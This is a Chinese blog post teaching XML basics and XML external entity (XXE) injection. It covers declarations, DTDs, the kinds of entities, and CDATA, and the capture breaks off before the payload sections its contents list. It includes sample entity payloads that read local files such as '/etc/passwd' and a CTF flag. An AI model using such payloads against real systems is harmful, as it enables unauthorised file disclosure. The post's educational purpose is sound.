<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='0x01 前言 前两天看了一下xxe的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议\n0x02 question xml了解 XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主要用于定义数据，而不是显示数据。XML 的设计目标是数据的可移植性、可读性以及易于扩展。也就是和序列化差不多的特点(但是不能混为一谈哦)\nXML 文档的结构通常由三部分组成：XML 声明、**DTD(可选的文档类型定义) **和 **元素(内容部分) **。\n写一个xml的demo来分析这三个结构\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE bookstore SYSTEM "bookstore.dtd"> <bookstore> <book category="fiction"> <title lang="en">The Great Gatsby</title> <author>F. Scott Fitzgerald</author> <year>1925</year> <price>10.99</price> </book> <book category="non-fiction"> <title lang="en">Sapiens: A Brief History of Humankind</title> <author>Yuval Noah Harari</author> <year>2011</year> <price>14.99</price> </book> </bookstore> xml声明 这个东西就类似于，使用C语言编程的\n'><title>深入浅出xxe</title><link rel=canonical href=https://baozongwi.xyz/p/xxe-in-depth/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="深入浅出xxe"><meta property='og:description' content='0x01 前言 前两天看了一下xxe的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议\n0x02 question xml了解 XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主要用于定义数据，而不是显示数据。XML 的设计目标是数据的可移植性、可读性以及易于扩展。也就是和序列化差不多的特点(但是不能混为一谈哦)\nXML 文档的结构通常由三部分组成：XML 声明、**DTD(可选的文档类型定义) **和 **元素(内容部分) **。\n写一个xml的demo来分析这三个结构\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE bookstore SYSTEM "bookstore.dtd"> <bookstore> <book category="fiction"> <title lang="en">The Great Gatsby</title> <author>F. Scott Fitzgerald</author> <year>1925</year> <price>10.99</price> </book> <book category="non-fiction"> <title lang="en">Sapiens: A Brief History of Humankind</title> <author>Yuval Noah Harari</author> <year>2011</year> <price>14.99</price> </book> </bookstore> xml声明 这个东西就类似于，使用C语言编程的\n'><meta property='og:url' content='https://baozongwi.xyz/p/xxe-in-depth/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='xxe'><meta property='article:tag' content='姿势'><meta property='article:published_time' content='2024-09-18T11:52:15+00:00'><meta property='article:modified_time' content='2024-09-18T11:52:15+00:00'><meta name=twitter:title content="深入浅出xxe"><meta name=twitter:description content='0x01 前言 前两天看了一下xxe的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议\n0x02 question xml了解 XML（Extensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主要用于定义数据，而不是显示数据。XML 的设计目标是数据的可移植性、可读性以及易于扩展。也就是和序列化差不多的特点(但是不能混为一谈哦)\nXML 文档的结构通常由三部分组成：XML 声明、**DTD(可选的文档类型定义) **和 **元素(内容部分) **。\n写一个xml的demo来分析这三个结构\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE bookstore SYSTEM "bookstore.dtd"> <bookstore> <book category="fiction"> <title lang="en">The Great Gatsby</title> <author>F. Scott Fitzgerald</author> <year>1925</year> <price>10.99</price> </book> <book category="non-fiction"> <title lang="en">Sapiens: A Brief History of Humankind</title> <author>Yuval Noah Harari</author> <year>2011</year> <price>14.99</price> </book> </bookstore> xml声明 这个东西就类似于，使用C语言编程的\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#xml了解>xml了解</a><ol><li><a href=#xml声明>xml声明</a></li><li><a href=#dtd>DTD</a><ol><li><a href=#内部实体>内部实体</a></li><li><a href=#外部实体>外部实体</a></li><li><a href=#参数实体>参数实体</a></li><li><a href=#字符实体>字符实体</a></li><li><a href=#pcdatacdata>PCDATA&&amp;CDATA</a></li></ol></li><li><a href=#元素>元素</a></li></ol></li><li><a href=#xxe>xxe</a><ol><li><a href=#demo1>Demo1</a></li><li><a href=#demo2>Demo2</a></li><li><a href=#demo3>Demo3</a></li><li><a href=#demo4>Demo4</a></li></ol></li><li><a href=#参考payload>参考payload</a><ol><li><a href=#文件读取>文件读取</a></li><li><a href=#blind-文件读取>blind 文件读取</a></li><li><a href=#ddos>DDoS</a></li><li><a href=#ssrfinclude>ssrf\include</a></li><li><a href=#rce>RCE</a></li></ol></li><li><a href=#fix>fix</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/xxe-in-depth/>深入浅出xxe</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-09-18T11:52:15Z>Sep 18, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 511 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>前两天看了一下<code>xxe</code>的题目，感觉也可以来补补这个基础知识来，为了这个，还浅浅的了解了一下伪协议</p><h1 id=0x02-question>0x02 question</h1><h2 id=xml了解>xml了解</h2><blockquote><p>XML（<strong>Extensible Markup Language</strong>，可扩展标记语言）是一种用于存储和传输数据的标记语言，它类似于 HTML，但更加灵活，主要用于定义数据，而不是显示数据。XML 的设计目标是<strong>数据的可移植性</strong>、<strong>可读性</strong>以及<strong>易于扩展</strong>。也就是和序列化差不多的特点(但是不能混为一谈哦)</p></blockquote><p>XML 文档的结构通常由三部分组成：<strong>XML 声明</strong>、**DTD(可选的文档类型定义) **和 **元素(内容部分) **。</p><p>写一个<code>xml</code>的<code>demo</code>来分析这三个结构</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE bookstore SYSTEM &#34;bookstore.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;bookstore&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;book</span> <span class=na>category=</span><span class=s>&#34;fiction&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;title</span> <span class=na>lang=</span><span class=s>&#34;en&#34;</span><span class=nt>&gt;</span>The Great Gatsby<span class=nt>&lt;/title&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;author&gt;</span>F. Scott Fitzgerald<span class=nt>&lt;/author&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;year&gt;</span>1925<span class=nt>&lt;/year&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;price&gt;</span>10.99<span class=nt>&lt;/price&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/book&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;book</span> <span class=na>category=</span><span class=s>&#34;non-fiction&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;title</span> <span class=na>lang=</span><span class=s>&#34;en&#34;</span><span class=nt>&gt;</span>Sapiens: A Brief History of Humankind<span class=nt>&lt;/title&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;author&gt;</span>Yuval Noah Harari<span class=nt>&lt;/author&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;year&gt;</span>2011<span class=nt>&lt;/year&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;price&gt;</span>14.99<span class=nt>&lt;/price&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/book&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/bookstore&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=xml声明>xml声明</h3><p>这个东西就类似于，使用C语言编程的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span></code></pre></td></tr></table></div></div><p>所以也就是基本固定的，只不过有些选项是可选的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><code>standalone="yes"</code>：表示这个 XML 文档是否依赖外部的 DTD 或其他外部实体。选项有：</p><ul><li><code>yes</code>：表示文档是自包含的，不依赖外部定义。</li><li><code>no</code>：表示文档依赖外部 DTD 或实体。</li></ul><p>但是由于我们<code>xxe</code>是<strong>xml外部实体注入</strong>(<del>等会说</del>)，所以肯定是不写这个或者是写<code>no</code></p><h3 id=dtd>DTD</h3><p>而这里又分为内部实体\外部实体\字符实体\参数实体，都是为了方便做参数替换来使用的，可以帮助简化和减少代码冗余。然后再使用<code>&</code>进行调用(和C一样)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE user [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY file SYSTEM  &#34;file:///flag&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span></code></pre></td></tr></table></div></div><p>一个很普通的DTD，这里主要就是想强调一个点</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE 根元素 [嵌套实体]&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里是要写根元素的，而不是想怎么写就怎么来(<del>实际上好像不这么写也能生效</del>)</p><h4 id=内部实体>内部实体</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE 根元素 [元素声明]&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>比如说</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE example [
</span></span></span><span class=line><span class=cl><span class=cp>    &lt;!ENTITY author &#34;Linjiang Zheng&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;example&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;author&gt;</span><span class=ni>&amp;author;</span><span class=nt>&lt;/author&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/example&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>那么此刻<code>author</code>表单的内容就是<code>Linjiang Zheng</code></p><h4 id=外部实体>外部实体</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY 实体名称 SYSTEM &#34;URL or path&#34;&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>还是写个<code>Demo</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE llw [
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY file SYSTEM  &#34;file:///flag&#34;&gt;</span>
</span></span><span class=line><span class=cl>]&gt;
</span></span><span class=line><span class=cl><span class=nt>&lt;user&gt;</span>
</span></span><span class=line><span class=cl>	<span class=nt>&lt;username&gt;</span><span class=ni>&amp;file;</span><span class=nt>&lt;/username&gt;</span>
</span></span><span class=line><span class=cl>	<span class=nt>&lt;password&gt;</span>1<span class=nt>&lt;/password&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/user&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>就比如我们常见的，直接利用协议进行<code>flag</code>的读取</p><p><img src=/p/xxe-in-depth/QQ20240918-150130.png width=555 height=189 loading=lazy alt=1></p><p>这些协议都可以使用</p><h4 id=参数实体>参数实体</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % 实体名称 SYSTEM &#34;URL or path&#34;&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>与外部实体略有不同</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE a [
</span></span></span><span class=line><span class=cl><span class=cp>    &lt;!ENTITY % name SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
</span></span><span class=line><span class=cl>    %name;
</span></span><span class=line><span class=cl>]&gt;
</span></span></code></pre></td></tr></table></div></div><p>注意这种写法只可以在<code>dtd</code>文件中使用,也就是打无回显的<code>xxe</code></p><h4 id=字符实体>字符实体</h4><h5 id=预定义>预定义</h5><p>这些是XML标准中已经定义好的一些常见字符，例如：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=ni>&amp;lt;</span> 表示小于号 <span class=err>&lt;</span>
</span></span><span class=line><span class=cl><span class=ni>&amp;gt;</span> 表示大于号 &gt;
</span></span><span class=line><span class=cl><span class=ni>&amp;amp;</span> 表示与号 <span class=err>&amp;</span>
</span></span><span class=line><span class=cl><span class=ni>&amp;quot;</span> 表示双引号 &#34;
</span></span><span class=line><span class=cl><span class=ni>&amp;apos;</span> 表示单引号 &#39;
</span></span></code></pre></td></tr></table></div></div><h5 id=数字>数字</h5><ul><li><strong>十进制数字实体</strong>：形式为 <code>&amp;#decimal;</code>，其中 <code>decimal</code> 是字符的十进制Unicode码点。</li><li><strong>十六进制数字实体</strong>：形式为 <code>&amp;#xhex;</code> 或 <code>&amp;#Xhex;</code>，其中 <code>hex</code> 是字符的十六进制Unicode码点。</li></ul><p>比如说</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;user&gt;</span><span class=ni>&amp;#60;</span><span class=nt>&lt;/user&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;user&gt;</span><span class=ni>&amp;#x3C;</span><span class=nt>&lt;/user&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>都表示<code>&lt;</code></p><div class=table-wrapper><table><thead><tr><th>原字符</th><th>预定义</th><th>十六进制参考</th><th>十进制参考</th></tr></thead><tbody><tr><td><code>"</code></td><td><code>&amp;quot;</code></td><td><code>&amp;#x22;</code></td><td><code>&amp;#34;</code></td></tr><tr><td><code>&</code></td><td><code>&amp;amp;</code></td><td><code>&amp;#x26;</code></td><td><code>&amp;#38;</code></td></tr><tr><td><code>'</code></td><td><code>&amp;apos;</code></td><td><code>&amp;#x27;</code></td><td><code>&amp;#39;</code></td></tr><tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td><td><code>&amp;#x3C;</code></td><td><code>&amp;#60;</code></td></tr><tr><td><code>></code></td><td><code>&amp;gt;</code></td><td><code>&amp;#x3E;</code></td><td><code>&amp;#62;</code></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>这张表格由于解析问题只能手做服了</p><h4 id=pcdatacdata>PCDATA&&amp;CDATA</h4><p><strong>PCDATA</strong> 是 “Parsed Character Data” 的缩写，表示<strong>可解析的字符数据</strong>。也就是说，PCDATA 中的字符会被解析器解析，并根据 XML 或 HTML 的语法规则进行处理。</p><p>在 PCDATA 中，某些字符（如 <code>&lt;</code>、<code>&</code> 等）不能直接使用，必须进行转义或作为标签来使用。例如 <code>&lt;</code> 被解析为标签的开始，<code>&</code> 被解析为实体引用的开始。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;note&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;to&gt;</span>Tove<span class=nt>&lt;/to&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;message&gt;</span>Hello,<span class=ni>&amp;#60;</span>world<span class=ni>&amp;#62;</span><span class=nt>&lt;/b&gt;</span>!<span class=nt>&lt;/message&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/note&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>CDATA 是 “Character Data” 的缩写，表示<strong>不可解析的字符数据</strong>。也就是说，CDATA 部分的内容会被当作纯文本处理，不会进行解析。</p><p>CDATA 区块中的所有字符，包括特殊字符（如 <code>&lt;</code>、<code>></code> 和 <code>&</code>），都会被当作原始文本保留，而不是作为标签或实体解析。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;message&gt;</span><span class=cp>&lt;![CDATA[Hello, &lt;b&gt;world&lt;/b&gt;!]]&gt;</span><span class=nt>&lt;/message&gt;</span>
